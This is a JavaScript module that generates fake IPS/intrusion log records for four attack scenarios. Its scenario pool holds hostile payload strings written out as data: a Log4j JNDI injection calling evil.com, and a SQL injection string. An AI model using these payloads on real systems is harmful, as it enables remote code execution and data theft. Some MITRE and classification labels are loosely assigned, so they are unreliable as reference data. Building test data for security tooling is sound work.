
// --- Data Pools for Realistic IPS Log Randomization ---
const vendors = ["Palo Alto Networks", "Cisco", "Fortinet", "Check Point", "Suricata"];
const products = {
    "Palo Alto Networks": "PA-Series",
    "Cisco": "Firepower",
    "Fortinet": "FortiGate",
    "Check Point": "Quantum IPS",
    "Suricata": "Suricata"
};
const severities = ["Critical", "High", "Medium", "Low", "Informational"];
const attackCategories = ["Exploit", "Malware", "Reconnaissance", "Policy Violation", "Denial of Service", "Web Application Attack"];
const protocols = ["TCP", "UDP", "ICMP"];
const ruleActions = ["alert", "drop", "reset", "block"];
const directions = ["inbound", "outbound", "lateral"];
const httpMethods = ["GET", "POST", "PUT", "DELETE", "HEAD"];
const geoCountries = ["China", "Russia", "United States", "Netherlands", "Germany", "Brazil"];
const isps = ["Tencent Cloud", "DigitalOcean", "Hetzner Online GmbH", "OVH SAS", "Choopa, LLC"];

// --- Signature & Attack Scenario Pools ---
const signatureScenarios = {
    webExploit: {
        signature_name: "ET EXPLOIT Apache Log4j JNDI Injection (CVE-2021-44228)",
        attack_type: "Remote Code Execution",
        attack_category: "Web Application Attack",
        cve_id: "CVE-2021-44228",
        mitre_technique_id: "T1210",
        mitre_tactic: "Exploitation for Initial Access",
        severity: "Critical",
        payload_snippet: "${jndi:ldap://evil.com/a}",
        protocol: "TCP",
        dst_port: 8080,
        http_method: "GET",
        http_uri: "/search?q=${jndi:ldap...}",
    },
    malwareDownload: {
        signature_name: "ET MALWARE Win32/Trickbot CnC Activity",
        attack_type: "Malicious File Transfer",
        attack_category: "Malware",
        malware_family: "TrickBot",
        severity: "High",
        file_name: "invoice_update.exe",
        file_type: "Win32 PE",
        protocol: "TCP",
        dst_port: 443,
    },
    sqlInjection: {
        signature_name: "ET WEB_SERVER SQL Injection Attempt in URI",
        attack_type: "SQL Injection",
        attack_category: "Web Application Attack",
        cve_id: "N/A",
        mitre_technique_id: "T1190",
        mitre_tactic: "Exploit Public-Facing Application",
        severity: "High",
        payload_snippet: "' OR 1=1 --",
        protocol: "TCP",
        dst_port: 80,
        http_method: "GET",
        http_uri: "/products.php?id=12' OR 1=1 --",
    },
    c2Beacon: {
        signature_name: "ET TROJAN Cobalt Strike Malleable C2 Beacon",
        attack_type: "Command and Control",
        attack_category: "Malware",
        malware_family: "Cobalt Strike",
        severity: "Critical",
        direction: "outbound",
        protocol: "TCP",
        dst_port: 443,
    }
};

// --- Helper Functions ---
const getRandomElement = (arr) => arr[Math.floor(Math.random() * arr.length)];
const generateGUID = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
    const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
    return v.toString(16);
});
const generateIP = (isPrivate = false) => {
    if (isPrivate) return `192.168.${Math.floor(Math.random()*256)}.${Math.floor(Math.random()*254)+1}`;
    return `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 256)}.${Math.floor(Math.random() * 254) + 1}`;
};
const generateHash = (len) => [...Array(len)].map(() => Math.floor(Math.random() * 16).toString(16)).join('');

// --- Main Exported Function ---
export const generateIpsLog = (options = {}) => {
    const eventTime = new Date(Date.now() - Math.floor(Math.random() * 1000 * 3600 * 24));
    const vendor = getRandomElement(vendors);
    
    // 1. Pick an attack scenario
    const scenarioKey = getRandomElement(Object.keys(signatureScenarios));
    const scenario = signatureScenarios[scenarioKey];
    
    // 2. Determine action based on severity
    let actionTaken = "alert";
    if (scenario.severity === "Critical" || scenario.severity === "High") {
        actionTaken = getRandomElement(["drop", "block", "reset"]);
    }

    // 3. Populate base log and scenario-specific data
    const baseLog = {
        // --- General ---
        event_time: eventTime.toISOString(),
        event_type: "intrusion",
        event_id: generateGUID(),
        sensor_id: `sensor-${Math.floor(Math.random() * 4) + 1}`,
        vendor,
        product: products[vendor],
        product_version: "10.1.5",
        log_source: `ips-${getRandomElement(["dc1", "dmz", "edge"])}`,
        severity: scenario.severity,
        priority: "high",
        confidence_level: "high",
        classification: "A Network Trojan was detected",
        
        // --- Signature ---
        signature_id: Math.floor(Math.random() * 2000000) + 2000000,
        signature_name: scenario.signature_name,
        signature_revision: Math.floor(Math.random() * 10) + 1,
        attack_type: scenario.attack_type,
        attack_category: scenario.attack_category,
        threat_name: scenario.malware_family || scenario.attack_type,
        cve_id: scenario.cve_id || "N/A",
        reference_url: `https://cve.mitre.org/cgi-bin/cvename.cgi?name=${scenario.cve_id || ''}`,
        mitre_technique_id: scenario.mitre_technique_id || "N/A",
        mitre_tactic: scenario.mitre_tactic || "N/A",
        malware_family: scenario.malware_family || "N/A",
        rule_action: actionTaken,
        policy_id: `POLICY-${Math.floor(Math.random() * 5) + 1}`,
        policy_name: "Default Security Policy",

        // --- Network ---
        src_ip: scenario.direction === "outbound" ? generateIP(true) : generateIP(),
        src_port: Math.floor(Math.random() * 60000) + 1024,
        dst_ip: scenario.direction === "outbound" ? generateIP() : generateIP(true),
        dst_port: scenario.dst_port || Math.floor(Math.random() * 60000) + 1024,
        interface_in: "eth0",
        interface_out: "eth1",
        direction: scenario.direction || "inbound",
        protocol: scenario.protocol || getRandomElement(protocols),
        application: scenario.dst_port === 443 ? "ssl" : (scenario.dst_port === 80 ? "http" : "unknown"),
        session_id: Math.floor(Math.random() * 1e9),
        bytes_sent: Math.floor(Math.random() * 5000),
        bytes_received: Math.floor(Math.random() * 50000),
        packets_sent: Math.floor(Math.random() * 50),
        packets_received: Math.floor(Math.random() * 100),
        duration: Math.floor(Math.random() * 300),
        
        // --- Payload / Context ---
        payload_snippet: scenario.payload_snippet || "",
        http_method: scenario.http_method || null,
        http_host: scenario.http_host || `www.example.com`,
        http_uri: scenario.http_uri || null,
        user_agent: scenario.http_method ? "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36" : null,
        file_name: scenario.file_name || null,
        file_type: scenario.file_type || null,
        file_hash_sha256: scenario.file_name ? generateHash(64) : null,
        
        // --- GeoIP ---
        geoip_src_country: scenario.direction === "outbound" ? "Internal" : getRandomElement(geoCountries),
        geoip_dst_country: scenario.direction === "outbound" ? getRandomElement(geoCountries) : "Internal",
        asn: Math.floor(Math.random() * 50000) + 1000,
        organization: getRandomElement(isps),
        isp: getRandomElement(isps),

        // --- User/Device (less common in network IPS) ---
        user_name: Math.random() < 0.2 ? `corp\\${getRandomElement(["j.doe", "s.smith"])}` : null,

        // --- Remediation ---
        action_taken: actionTaken,
        action_status: "success",
        was_blocked: actionTaken === "block",
        was_reset: actionTaken === "reset",
        was_alerted_only: actionTaken === "alert",
        was_dropped: actionTaken === "drop",
        remediation_status: "completed",
        follow_up_required: scenario.severity === "Critical",
    };

    return baseLog;
};
